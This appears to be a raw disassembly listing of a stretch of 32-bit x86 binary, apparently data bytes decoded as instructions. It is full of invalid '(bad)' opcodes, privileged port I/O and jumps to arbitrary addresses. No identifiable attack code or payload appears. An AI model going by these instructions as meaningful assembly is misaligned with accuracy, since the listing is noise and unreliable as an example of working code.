  42f0e9:	cmp    bl,BYTE PTR [edx]
  42f0eb:	jo     0x42f0df
  42f0ed:	js     0x42f132
  42f0ef:	push   ss
  42f0f0:	jb     0x42f163
  42f0f2:	addr16 jg 0x42f0f7
  42f0f5:	fcomp  DWORD PTR [esi+0x7c]
  42f0f8:	cdq    
  42f0f9:	in     al,dx
  42f0fa:	adc    ah,BYTE PTR [edx+0x3f]
  42f0fd:	inc    edi
  42f0fe:	int3   
  42f0ff:	pop    ds
  42f100:	cdq    
  42f101:	retf   
  42f102:	xchg   ebx,eax
  42f103:	icebp  
  42f104:	xchg   ebx,eax
  42f105:	ins    DWORD PTR es:[edi],dx
  42f106:	aas    
  42f107:	or     eax,0x11e80ecf
  42f10c:	mov    DWORD PTR [ebp-0x19beea31],eax
  42f112:	aad    0x3f
  42f114:	sbb    ch,BYTE PTR [eax]
  42f116:	cmc    
  42f117:	adc    DWORD PTR [ebp-0xdc780d1],esi
  42f11d:	dec    eax
  42f11e:	pop    edx
  42f11f:	dec    ecx
  42f120:	stc    
  42f121:	out    0x79,al
  42f123:	dec    edi
  42f124:	push   es
  42f125:	xor    cl,BYTE PTR [edx+0x5003396]
  42f12b:	fstp   TBYTE PTR [edx]
  42f12d:	stc    
  42f12e:	dec    edi
  42f12f:	jmp    0x2701:0x56945f56
  42f136:	inc    edi
  42f137:	stos   BYTE PTR es:[edi],al
  42f138:	mov    cs,WORD PTR [ecx]
  42f13a:	dec    ecx
  42f13b:	outs   dx,BYTE PTR ds:[esi]
  42f13c:	stos   BYTE PTR es:[edi],al
  42f13d:	mov    BYTE PTR [ebx-0x30e02b69],cl
  42f143:	inc    esi
  42f144:	nop
  42f145:	dec    esi
  42f146:	pop    edi
  42f147:	or     al,0xa
  42f149:	pushf  
  42f14a:	outs   dx,DWORD PTR ds:[esi]
  42f14b:	idiv   al
  42f14d:	push   ebx
  42f14e:	out    dx,al
  42f14f:	and    ebp,DWORD PTR [esi-0x10e1d1dc]
  42f155:	lea    esp,[edx]
  42f157:	out    0x21,eax
  42f159:	xchg   esi,eax
  42f15a:	addr16 xchg esp,eax
  42f15c:	push   ebx
  42f15d:	sbb    esp,DWORD PTR [ecx*2+0x5215af75]
  42f164:	in     eax,0x22
  42f166:	out    0xc,eax
  42f168:	jae    0x42f179
  42f16a:	loop   0x42f1c7
  42f16c:	(bad)  
  42f16d:	dec    ebp
  42f16e:	test   eax,0x2fa45fe7
  42f173:	cmp    al,0xfd
  42f175:	xchg   esp,eax
  42f176:	retf   
  42f177:	pop    ecx
  42f178:	pop    edx
  42f179:	(bad)  
  42f17a:	jbe    0x42f151
  42f17c:	test   eax,0x5f1802cd
  42f181:	push   es
  42f182:	sub    DWORD PTR [eax],0x65
  42f185:	xchg   ecx,eax
  42f186:	dec    edx
  42f187:	sub    DWORD PTR [ebx],edx
  42f189:	inc    eax
  42f18a:	push   esi
  42f18b:	rcl    DWORD PTR [ebx+ecx*4],cl
  42f18e:	add    al,0x1c
	...
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	or     ch,BYTE PTR [ecx]
  42f202:	stos   BYTE PTR es:[edi],al
  42f203:	sahf   
  42f204:	fs clc 
  42f206:	add    DWORD PTR [eax],eax
  42f208:	add    al,0x1
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	pop    ebx
  42f20d:	rcr    DWORD PTR [ebp+0x70],cl
  42f210:	dec    esp
  42f211:	test   DWORD PTR [esi+0xa07720e],ebp
  42f217:	xchg   BYTE PTR [ebx+0x2163fe24],bl
  42f21d:	sub    bl,al
  42f21f:	push   0x2a97cb60
  42f224:	jg     0x42f1de
  42f226:	js     0x42f24a
  42f228:	rol    cl,0x84
  42f22b:	dec    esi
  42f22c:	jl     0x42f20e
  42f22e:	xor    eax,DWORD PTR [edi-0x18]
  42f231:	loop   0x42f1db
  42f233:	dec    ebx
  42f234:	fnstsw WORD PTR [esi-0x4e4d399d]
  42f23a:	imul   edx,DWORD PTR [edx],0xffffffa0
  42f23d:	inc    esp
  42f23e:	es jge 0x42f28b
  42f241:	jnp    0x42f1c8
  42f243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f244:	mov    edi,0xb17206cb
  42f249:	enter  0xb2da,0xde
  42f24d:	mov    esi,0xe6885d8a
  42f252:	dec    esi
  42f253:	div    DWORD PTR [ebx-0x12220c4b]
  42f259:	push   esp
  42f25a:	scas   eax,DWORD PTR es:[edi]
  42f25b:	xchg   ebx,eax
  42f25c:	(bad)  
  42f25d:	push   eax
  42f25e:	cs popa 
  42f260:	scas   eax,DWORD PTR es:[edi]
  42f261:	mov    ds:0x2cbac157,eax
  42f266:	(bad)  
  42f267:	lahf   
  42f268:	jle    0x42f214
  42f26a:	in     eax,dx
  42f26b:	sti    
  42f26c:	add    eax,0xca1bbe46
  42f271:	pop    esp
  42f272:	xor    eax,0x64ddde1e
  42f277:	xchg   DWORD PTR [eax+0x6],edx
  42f27a:	mov    ah,0x32
  42f27c:	inc    ebx
  42f27d:	les    ebx,FWORD PTR ds:0x252faa84
  42f283:	jge    0x42f26d
  42f285:	and    eax,0x3dcf29e7
  42f28a:	add    DWORD PTR [ebx+0x235f885a],ecx
  42f290:	mov    DWORD PTR [ebx+0x19eecd32],eax
  42f296:	mov    ds:0x49f6a811,eax
  42f29b:	mov    ebp,0xfe8c2bc4
  42f2a0:	addr16 xor al,0xf
  42f2a3:	imul   DWORD PTR [eax-0x2e2957d2]
  42f2a9:	stc    
  42f2aa:	mov    esp,0x3d7751dd
  42f2af:	inc    esp
  42f2b0:	sbb    DWORD PTR [edi*8-0x4462c039],0x4c
  42f2b8:	adc    dl,BYTE PTR [esi-0x510b772]
  42f2be:	mov    edi,0x2ee4f1e7
  42f2c3:	int3   
  42f2c4:	pop    esp
  42f2c5:	cli    
  42f2c6:	xchg   ecx,eax
  42f2c7:	mov    ecx,DWORD PTR [ecx]
  42f2c9:	inc    eax
  42f2ca:	mov    ds,WORD PTR [edx+0x7964efc6]
  42f2d0:	outs   dx,BYTE PTR ds:[esi]
  42f2d1:	ret    0x7d28
  42f2d4:	in     al,dx
  42f2d5:	in     al,dx
  42f2d6:	(bad)  
  42f2d7:	xchg   edi,eax
  42f2d8:	imul   eax,DWORD PTR [esi*8+0x5c15b043],0x3d
  42f2e0:	cmp    BYTE PTR [ecx+0x3130b16b],cl
  42f2e6:	nop
  42f2e7:	cld    
  42f2e8:	add    al,0x5c
  42f2ea:	add    BYTE PTR [esi],dh
  42f2ec:	push   ss
  42f2ed:	jl     0x42f2d7
  42f2ef:	push   ds
  42f2f0:	stos   DWORD PTR es:[edi],eax
  42f2f1:	pop    edx
  42f2f2:	rcl    DWORD PTR [ecx+0x323fbe],1
  42f2f8:	cmp    esp,DWORD PTR [ebx]
  42f2fa:	jne    0x42f29e
  42f2fc:	dec    edi
  42f2fd:	inc    edx
  42f2fe:	aad    0x8
  42f300:	les    esp,FWORD PTR [eax]
  42f302:	and    al,0xb4
  42f304:	lods   al,BYTE PTR ds:[esi]
  42f305:	mov    fs,WORD PTR [eax]
  42f307:	scas   eax,DWORD PTR es:[edi]
  42f308:	or     BYTE PTR [eax+ebp*2],ch
  42f30b:	or     dh,BYTE PTR [eax-0x19]
  42f30e:	stos   BYTE PTR es:[edi],al
  42f30f:	mov    dh,0x0
	...
  42f371:	add    BYTE PTR [eax],al
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	sbb    ebx,esp
  42f382:	pop    edi
  42f383:	pushw  0x1f9
  42f387:	add    BYTE PTR [ecx+eax*1],al
  42f38a:	add    BYTE PTR [eax],al
  42f38c:	mov    DWORD PTR [esi],ebx
  42f38e:	mov    esi,0x876c6626
  42f393:	dec    ebp
  42f394:	ins    DWORD PTR es:[edi],dx
  42f395:	pushf  
  42f396:	iret   
  42f397:	jns    0x42f394
  42f399:	push   0x7e32d4d8
  42f39e:	inc    esp
  42f39f:	sbb    al,0x46
  42f3a1:	pop    ss
  42f3a2:	adc    al,0xd4
  42f3a4:	jecxz  0x42f422
  42f3a6:	sub    DWORD PTR [edi+0x1],ebx
  42f3a9:	xchg   ebp,eax
  42f3aa:	test   esp,edx
  42f3ac:	repnz popa 
  42f3ae:	ret    0xeed7
  42f3b1:	sub    BYTE PTR [ebx],bl
  42f3b3:	inc    BYTE PTR [edi]
  42f3b5:	(bad)
  42f3b9:	sub    eax,0x3e39c082
  42f3be:	mov    cl,0x1b
  42f3c0:	addr16 mov esp,0x963a653f
  42f3c6:	mov    bh,0x15
  42f3c8:	ret    
  42f3c9:	adc    ebx,DWORD PTR [eax+ebx*8-0xa]
  42f3cd:	js     0x42f3d7
  42f3cf:	sbb    eax,0x18ec9d30
  42f3d4:	push   0x48751e67
  42f3d9:	xor    esp,ecx
  42f3db:	mov    al,0x70
  42f3dd:	cmp    BYTE PTR [edi],bl
  42f3df:	daa    
  42f3e0:	mov    ds:0xb2cdc5a0,eax
  42f3e5:	xor    al,0xf
  42f3e7:	dec    ebp
  42f3e8:	jno    0x42f401
  42f3ea:	cmp    al,0x9f
  42f3ec:	xor    eax,0xd739b58d
  42f3f1:	and    ch,al
  42f3f3:	jno    0x42f3c1
  42f3f5:	add    eax,DWORD PTR [edi+0x279db072]
  42f3fb:	push   es
  42f3fc:	js     0x42f435
  42f3fe:	add    bl,BYTE PTR [edi]
  42f400:	sbb    al,0x91
  42f402:	scas   al,BYTE PTR es:[edi]
  42f403:	jbe    0x42f3ad
  42f405:	clc    
  42f406:	xchg   edi,eax
  42f407:	fs out dx,eax
  42f409:	pop    ds
  42f40a:	jp     0x42f38d
  42f40c:	loopne 0x42f39b
  42f40e:	les    ebx,FWORD PTR [eax-0x14]
  42f411:	sbb    eax,0x86346fd3
  42f416:	jecxz  0x42f42a
  42f418:	jb     0x42f40b
  42f41a:	out    dx,al
  42f41b:	sbb    DWORD PTR [edi+0x67],ecx
  42f41e:	shl    DWORD PTR es:[esi+edx*8+0xa],0x1d
  42f424:	cs or  al,0x95
  42f427:	mov    ds:0x9f5f1e1d,eax
  42f42c:	add    ecx,DWORD PTR [ebp+edi*4-0x11aaba17]
  42f433:	gs dec esi
  42f435:	sbb    dh,BYTE PTR [esi-0x9]
  42f438:	xchg   esp,eax
  42f439:	pop    esp
  42f43a:	jmp    0xa52d4e45
  42f43f:	jg     0x42f49c
  42f441:	dec    eax
  42f442:	cmp    DWORD PTR [edi-0x2e],esi
  42f445:	test   BYTE PTR ds:0x755c1115,0x3c
  42f44c:	lahf   
  42f44d:	addr16 dec edx
  42f44f:	push   esi
  42f450:	ret    0x35cd
  42f453:	mov    bl,BYTE PTR [ebp+0xc796abc]
  42f459:	frstor [edx+ebp*4-0x68]
  42f45d:	sbb    edx,DWORD PTR [ebx+0x6e]
  42f460:	stc    
  42f461:	push   ebp
  42f462:	(bad)  
  42f463:	(bad)  
  42f464:	jno    0x42f4a1
  42f466:	bound  ecx,QWORD PTR [edx-0x10964cf1]
  42f46c:	imul   ebp,DWORD PTR [ecx-0x4d],0x960a0943
  42f473:	xchg   ebp,eax
  42f474:	push   esi
  42f475:	gs adc al,0x24
  42f478:	dec    esp
  42f479:	adc    BYTE PTR [edx],dh
  42f47b:	lods   eax,DWORD PTR ds:[esi]
  42f47c:	cmp    bl,BYTE PTR [ebx+0x3e02415c]
  42f482:	jae    0x42f483
  42f484:	mov    cl,0x3e
  42f486:	push   cs
  42f487:	cmp    bh,ah
  42f489:	inc    ecx
  42f48a:	or     eax,0xa49ebc0b
  42f48f:	add    BYTE PTR gs:[eax],al
	...
  42f4f2:	add    BYTE PTR [eax],al
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	mov    dh,0x5f
  42f502:	lods   al,BYTE PTR ds:[esi]
  42f503:	shr    DWORD PTR [edx+edi*8+0x1],0x0
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	repnz scas eax,DWORD PTR es:[edi]
  42f50e:	fiadd  DWORD PTR [ebx-0x2e93948c]
  42f514:	stos   DWORD PTR es:[edi],eax
  42f515:	add    BYTE PTR [edx+0x32ebaa8b],0x48
  42f51c:	xchg   ebp,eax
  42f51d:	pop    ecx
  42f51e:	test   al,0x8b
  42f520:	push   ss
  42f521:	or     DWORD PTR ds:0xf620a693,esp
  42f527:	sbb    DWORD PTR [edi-0x319d68d1],ecx
  42f52d:	mov    ebx,0x81f3e9a7
  42f532:	xchg   ebp,eax
  42f533:	stc    
  42f534:	lods   al,BYTE PTR ds:[esi]
  42f535:	sub    esi,DWORD PTR [edx+0x4b0919a7]
  42f53b:	mov    bh,0x28
  42f53d:	or     al,0xbc
  42f53f:	jg     0x42f56a
  42f541:	push   ds
  42f542:	(bad)  
  42f543:	dec    eax
  42f544:	and    dh,cl
  42f546:	not    DWORD PTR [ebx+0x7c]
  42f549:	and    eax,0x4ebf5a72
  42f54e:	pop    esp
  42f54f:	pushf  
  42f550:	inc    esp
  42f551:	in     al,0x7
  42f553:	test   al,0xc8
  42f555:	sar    BYTE PTR [eax+0x62],cl
  42f558:	add    eax,0x32ba3837
  42f55d:	int    0x68
  42f55f:	inc    eax
  42f560:	daa    
  42f561:	dec    esi
  42f562:	cmp    eax,0xf2bd7955
  42f567:	cmp    al,0xce
  42f569:	leave  
  42f56a:	push   ebx
  42f56b:	mov    al,ds:0x855f7618
  42f570:	enter  0x3fc4,0x19
  42f574:	xor    DWORD PTR ds:0xd3b49ede,edx
  42f57a:	adc    esp,DWORD PTR [ecx+0x66]
  42f57d:	clc    
  42f57e:	(bad)  
  42f57f:	fist   WORD PTR [edx-0x41]
  42f582:	pop    ds
  42f583:	call   0xeca83b38
  42f588:	mov    bl,0x28
  42f58a:	test   eax,0x2139b6c6
  42f58f:	mov    ah,0x1d
  42f591:	xchg   edx,eax
  42f592:	pop    esp
  42f593:	jno    0x42f53d
  42f595:	rcr    DWORD PTR [edx-0x3c0b03b1],0x8e
  42f59c:	push   edi
  42f59d:	xchg   bl,dl
  42f59f:	aas    
  42f5a0:	push   cs
  42f5a1:	xor    ebp,DWORD PTR [edi]
  42f5a3:	add    eax,0xc2733df9
  42f5a8:	jb     0x42f5e2
  42f5aa:	dec    ecx
  42f5ab:	fldcw  WORD PTR [ecx-0x7f]
  42f5ae:	pop    eax
  42f5af:	stc    
  42f5b0:	mov    ah,0xc6
  42f5b2:	cmc    
  42f5b3:	mov    ch,0xb6
  42f5b5:	xor    edi,esi
  42f5b7:	add    DWORD PTR [edi+0x66],ebx
  42f5ba:	jne    0x42f5c5
  42f5bc:	mov    ah,0x1e
  42f5be:	(bad)  
  42f5c0:	sar    BYTE PTR [eax+0x6b64c6cd],cl
  42f5c6:	sbb    al,0x4d
  42f5c8:	jg     0x42f5f8
  42f5ca:	dec    ebp
  42f5cb:	dec    ebp
  42f5cc:	shr    al,cl
  42f5ce:	dec    ebp
  42f5cf:	jecxz  0x42f583
  42f5d1:	out    dx,al
  42f5d2:	and    BYTE PTR [ebx-0x65],ch
  42f5d5:	(bad)
  42f5d8:	dec    ebp
  42f5d9:	jnp    0x42f626
  42f5db:	shl    BYTE PTR [ecx],1
  42f5dd:	jg     0x42f598
  42f5df:	repnz std 
  42f5e1:	push   esi
  42f5e2:	add    BYTE PTR [edx+0x16],al
  42f5e5:	clc    
  42f5e6:	fwait
  42f5e7:	ds push ds
  42f5e9:	ds daa 
  42f5eb:	(bad)  
  42f5ec:	pop    ss
  42f5ed:	push   0x6e
  42f5ef:	das    
  42f5f0:	xchg   BYTE PTR [ebp+0x1469267a],bl
  42f5f6:	mov    es,WORD PTR [ebp+0x93c6034]
  42f5fc:	mov    DWORD PTR [eax-0x5b858b49],0x1c2d56b4
  42f606:	fimul  WORD PTR [eax+eiz*8]
  42f609:	xchg   BYTE PTR ds:0x454db47a,al
  42f60f:	ins    DWORD PTR es:[edi],dx
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	sbb    ch,BYTE PTR [esi-0x34]
  42f683:	mov    BYTE PTR [eax-0x5],dh
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	xor    cl,BYTE PTR [edx-0xb]
  42f68f:	jp     0x42f6dc
  42f691:	out    0xdf,eax
  42f693:	xor    esp,DWORD PTR [edx+0x53]
  42f696:	lea    esi,[esi+0x45]
  42f699:	jle    0x42f6f5
  42f69b:	(bad)  
  42f69c:	dec    edx
  42f69d:	mov    bl,0x17
  42f69f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f6a0:	mov    ds:0x2e995892,eax
  42f6a5:	sub    BYTE PTR [ecx+ecx*4-0x6ef514e1],bl
  42f6ac:	(bad)  
  42f6ad:	sbb    ecx,eax
  42f6af:	sbb    ch,ah
  42f6b1:	jp     0x42f684
  42f6b3:	xchg   esi,eax
  42f6b4:	mov    esp,0x316df46a
  42f6b9:	add    BYTE PTR [eax+0x466ee2],ah
  42f6bf:	dec    edx
  42f6c0:	enter  0x380d,0xe9
  42f6c4:	mov    bh,0x3
  42f6c6:	mov    eax,0x1b684853
  42f6cb:	and    BYTE PTR [ebx+edi*4+0x6a5eff70],0x90
  42f6d3:	ja     0x42f67d
  42f6d5:	inc    esi
  42f6d6:	and    dh,dh
  42f6d8:	outs   dx,DWORD PTR ds:[esi]
  42f6d9:	lods   eax,DWORD PTR ds:[esi]
  42f6da:	dec    edi
  42f6db:	jg     0x42f73a
  42f6dd:	daa    
  42f6de:	cmp    eax,0x6aa072ff
  42f6e3:	ja     0x42f6ac
  42f6e5:	or     al,0x62
  42f6e7:	inc    eax
  42f6e8:	ffreep st(2)
  42f6ea:	push   ebp
  42f6eb:	repz adc edi,DWORD PTR [eax+0x4e0505fc]
  42f6f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f6f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6f4:	punpckhwd mm7,QWORD PTR [edi-0x3b39358]
  42f6fb:	sahf   
  42f6fc:	les    ebx,FWORD PTR [esi]
  42f6fe:	in     eax,dx
  42f6ff:	fsub   DWORD PTR [eax+0x1d]
  42f702:	clc    
  42f703:	jmp    0x85f2:0xb82b43af
  42f70a:	xor    ebx,edi
  42f70c:	outs   dx,DWORD PTR ds:[esi]
  42f70d:	dec    eax
  42f70e:	and    BYTE PTR [ecx+0x1e],ch
  42f711:	jp     0x42f709
  42f713:	(bad)  
  42f715:	dec    esp
  42f716:	and    BYTE PTR [esi+0x28],bl
  42f719:	lods   eax,DWORD PTR ds:[esi]
  42f71a:	cmp    edx,0xffffffc0
  42f71d:	xchg   ebp,eax
  42f71e:	fistp  QWORD PTR [eax]
  42f720:	mov    bl,0x82
  42f722:	mov    ds:0xab3cbc35,al
  42f727:	push   ebp
  42f728:	shl    DWORD PTR [ecx],1
  42f72a:	outs   dx,DWORD PTR ds:[esi]
  42f72b:	cmp    bh,BYTE PTR [ebx]
  42f72d:	inc    ebx
  42f72e:	xchg   ebx,eax
  42f72f:	cdq    
  42f730:	call   0x5495:0x14d2fb8
  42f737:	xor    eax,0xd9368117
  42f73c:	lods   al,BYTE PTR ds:[esi]
  42f73d:	mov    ebx,0x8dc85ba3
  42f742:	fsub   st(0),st
  42f744:	push   ss
  42f745:	sbb    eax,DWORD PTR [ecx+0x5883e00e]
  42f74b:	pop    edx
  42f74c:	rcr    ah,cl
  42f74e:	and    al,0xcb
  42f750:	les    edi,FWORD PTR [ebx+0x3b]
  42f753:	stc    
  42f754:	inc    eax
  42f755:	jl     0x42f6f5
  42f757:	push   edi
  42f758:	popa   
  42f759:	sub    ah,0xef
  42f75c:	pop    ss
  42f75d:	dec    edx
  42f75e:	push   ss
  42f75f:	and    eax,0xede7e156
  42f764:	jmp    FWORD PTR [esi+0x4cfd035b]
  42f76a:	cs dec eax
  42f76c:	fsubr  QWORD PTR [ecx+edi*4+0x13838f9]
  42f773:	sub    BYTE PTR [edx-0x3e],dl
  42f776:	or     DWORD PTR [edi-0x14],ebp
  42f779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f77a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f77b:	xchg   esi,eax
  42f77c:	(bad)  
  42f77d:	leave  
  42f77e:	adc    BYTE PTR [ebx],ch
  42f780:	sub    edx,edi
  42f782:	jp     0x42f760
  42f784:	ins    BYTE PTR es:[edi],dx
  42f785:	sub    ecx,DWORD PTR [ecx-0x66b310f7]
  42f78b:	shr    BYTE PTR [edx],0x24
  42f78e:	xchg   ebp,eax
  42f78f:	in     eax,dx
	...
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xaba9a1d9
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	js     0x42f832
  42f80e:	(bad)
  42f811:	mov    WORD PTR [ebx],fs
  42f813:	test   eax,0x7874bc7
  42f818:	add    ch,BYTE PTR [edi]
  42f81a:	nop
  42f81b:	retf   
  42f81c:	mov    DWORD PTR [eax+0x1f],esp
  42f81f:	adc    BYTE PTR [edx-0x7e1b34e5],dl
  42f825:	add    BYTE PTR [esi],al
  42f827:	test   eax,0xe0bf37f7
  42f82c:	xchg   di,ax
  42f82e:	mov    ch,BYTE PTR [ecx]
  42f830:	fistp  WORD PTR ss:[ebp-0x458689a5]
  42f837:	jl     0x42f824
  42f839:	cmp    al,0x35
  42f83b:	xchg   ecx,eax
  42f83c:	jle    0x42f834
  42f83e:	mov    eax,ds:0x551addd
  42f843:	jle    0x42f8c0
  42f845:	mov    dh,0x75
  42f847:	or     eax,0x32e61525
  42f84c:	adc    al,0x36
  42f84e:	popa   
  42f84f:	(bad)  
  42f850:	gs push esi
  42f852:	pop    esi
  42f853:	add    DWORD PTR [edi-0x52f1f63],edi
  42f859:	sub    DWORD PTR [ebx+0xe],ecx
  42f85c:	ror    DWORD PTR [ebx+0x6],1
  42f85f:	jnp    0x42f831
  42f861:	push   ebx
  42f862:	cmp    ecx,DWORD PTR [ebx]
  42f864:	gs jecxz 0x42f84b
  42f867:	mov    ch,0x4a
  42f869:	ins    DWORD PTR es:[edi],dx
  42f86a:	daa    
  42f86b:	adc    ch,bh
  42f86d:	jb     0x42f81f
  42f86f:	push   edx
  42f870:	xchg   esi,eax
  42f871:	cs retf 0x5c12
  42f875:	pop    ss
  42f876:	mov    bh,bh
  42f878:	ds aad 0xfa
  42f87b:	mov    edx,0x4f4ca36c
  42f880:	dec    edi
  42f881:	push   ss
  42f882:	dec    ecx
  42f883:	aam    0x9
  42f885:	outs   dx,DWORD PTR ds:[esi]
  42f886:	and    BYTE PTR [ebp-0x7d],ah
  42f889:	xchg   esp,eax
  42f88a:	(bad)  
  42f88c:	sub    ah,BYTE PTR ds:[edx+ecx*1+0x62db15b6]
  42f894:	add    eax,0xc1949056
  42f899:	out    dx,al
  42f89a:	or     eax,0xd51838ca
  42f89f:	aad    0xbb
  42f8a1:	pop    ecx
  42f8a2:	shl    BYTE PTR [esi+0x6da04517],cl
  42f8a8:	loopne 0x42f83b
  42f8aa:	mov    bl,0xe4
  42f8ac:	mov    ah,0xb4
  42f8ae:	je     0x42f882
  42f8b0:	jecxz  0x42f874
  42f8b2:	scas   eax,DWORD PTR es:[edi]
  42f8b3:	xor    al,0xe5
  42f8b5:	pop    esp
  42f8b6:	(bad)  
  42f8b7:	mov    WORD PTR [edi-0x1b5137e],fs
  42f8bd:	sbb    bl,BYTE PTR [eax+0x677f8d2]
  42f8c3:	iret   
  42f8c4:	dec    eax
  42f8c5:	or     al,BYTE PTR [edi]
  42f8c7:	sbb    BYTE PTR [edx],ch
  42f8c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f8ca:	jmp    0x607779f7
  42f8cf:	adc    BYTE PTR [eax-0x703c26cd],bl
  42f8d5:	mov    ds:0xee805a83,al
  42f8da:	inc    edx
  42f8db:	xchg   ebx,eax
  42f8dc:	popf   
  42f8dd:	adc    ah,BYTE PTR [edx]
  42f8df:	stos   BYTE PTR es:[edi],al
  42f8e0:	and    BYTE PTR [edx-0x65],bl
  42f8e3:	les    edx,FWORD PTR [ecx+esi*2-0x3f]
  42f8e7:	jbe    0x42f86a
  42f8e9:	fst    DWORD PTR [edx]
  42f8eb:	add    BYTE PTR [eax-0x23be95c3],ah
  42f8f1:	das    
  42f8f2:	loop   0x42f96c
  42f8f4:	sub    esi,DWORD PTR [eax+0x2f]
  42f8f7:	(bad)  
  42f8f8:	dec    edi
  42f8f9:	aaa    
  42f8fa:	pop    ds
  42f8fb:	aam    0xe2
  42f8fd:	call   0x28360fe9
  42f902:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f903:	lods   al,BYTE PTR ds:[esi]
  42f904:	ins    BYTE PTR es:[edi],dx
  42f905:	push   ecx
  42f906:	cmp    ecx,DWORD PTR [edx]
  42f908:	sbb    al,0x46
  42f90a:	test   BYTE PTR [ebp+0xf],cl
  42f90d:	aaa    
  42f90e:	aaa    
  42f90f:	sub    al,0x0
	...
  42f971:	add    BYTE PTR [eax],al
  42f973:	add    BYTE PTR [esp+esi*2],dl
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f9fe
  42f981:	out    dx,al
  42f982:	pushf  
  42f983:	ins    DWORD PTR es:[edi],dx
  42f984:	js     0x42f983
  42f986:	add    DWORD PTR [eax],eax
  42f988:	add    al,0x1
  42f98a:	add    BYTE PTR [eax],al
  42f98c:	xor    al,0xb6
  42f98e:	in     eax,0x27
  42f990:	xchg   ebx,eax
  42f991:	jge    0x42f95e
  42f993:	sbb    eax,0x29a9efab
  42f998:	jmp    0x42fa18
  42f99a:	hlt    
  42f99b:	lods   eax,DWORD PTR ds:[esi]
  42f99c:	mov    ?,ebx
  42f99e:	xchg   DWORD PTR [edx],ecx
  42f9a0:	sbb    bl,BYTE PTR [eax]
  42f9a2:	jle    0x42f9f3
  42f9a4:	pop    esi
  42f9a5:	mov    ebx,0xb8c86a10
  42f9aa:	xor    BYTE PTR [ebp+0x1c],ah
  42f9ad:	add    esp,DWORD PTR [ebx+0x29]
  42f9b0:	cmp    dh,BYTE PTR [eax+0x7deae688]
  42f9b6:	and    dh,BYTE PTR [eax+0x12811243]
  42f9bc:	push   esp
  42f9bd:	lods   eax,DWORD PTR ds:[esi]
  42f9be:	push   ecx
  42f9bf:	mov    edx,0xaaab1a8
  42f9c4:	je     0x42f976
  42f9c6:	dec    ecx
  42f9c7:	dec    esi
  42f9c8:	clc    
  42f9c9:	cld    
  42f9ca:	ins    BYTE PTR es:[edi],dx
  42f9cb:	pop    ecx
  42f9cc:	push   eax
  42f9cd:	popa   
  42f9ce:	inc    edx
  42f9cf:	stos   BYTE PTR es:[edi],al
  42f9d0:	repz (bad) 
  42f9d2:	outs   dx,BYTE PTR ds:[esi]
  42f9d3:	popf   
  42f9d4:	shr    DWORD PTR [eax+0x3f],0x42
  42f9d8:	or     BYTE PTR [eax-0x71],bh
  42f9db:	test   DWORD PTR [ebp-0x39],ecx
  42f9de:	mov    cl,0x96
  42f9e0:	push   esi
  42f9e1:	nop
  42f9e2:	clc    
  42f9e3:	in     eax,0xa3
  42f9e5:	or     al,0xbe
  42f9e7:	leave  
  42f9e8:	dec    ebp
  42f9e9:	inc    esp
  42f9ea:	xor    eax,0xc71f07e3
  42f9ef:	dec    esp
  42f9f0:	fadd   DWORD PTR [edi+0x5c011ad1]
  42f9f6:	pop    edi
  42f9f7:	add    ecx,DWORD PTR [eax+0x2f24ea5e]
  42f9fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9fe:	or     edi,DWORD PTR ds:0x415204e0
  42fa04:	adc    BYTE PTR [ebx],dh
  42fa06:	loope  0x42f9bf
  42fa08:	mov    eax,ds:0xb0151c4a
  42fa0d:	and    BYTE PTR [ebx-0x73],dh
  42fa10:	dec    ebx
  42fa11:	inc    ebx
  42fa12:	gs dec ebp
  42fa14:	stc    
  42fa15:	jb     0x42fa14
  42fa17:	cs hlt 
  42fa19:	xchg   esi,eax
  42fa1a:	sbb    eax,0x1f3ddf62
  42fa1f:	ret    0x4988
  42fa22:	xor    edi,DWORD PTR [edx+0x30]
  42fa25:	ror    BYTE PTR [ecx],cl
  42fa27:	stos   DWORD PTR es:[edi],eax
  42fa28:	stc    
  42fa29:	hlt    
  42fa2a:	lods   eax,DWORD PTR ds:[esi]
  42fa2b:	xchg   DWORD PTR [edx-0x1],ecx
  42fa2e:	sbb    cl,BYTE PTR [ebp-0x79ee277c]
  42fa34:	push   ds
  42fa35:	jecxz  0x42fab4
  42fa37:	adc    al,BYTE PTR [edx]
  42fa39:	push   ds
  42fa3a:	(bad)  
  42fa3b:	call   FWORD PTR [eax-0x19]
  42fa3e:	aad    0x3d
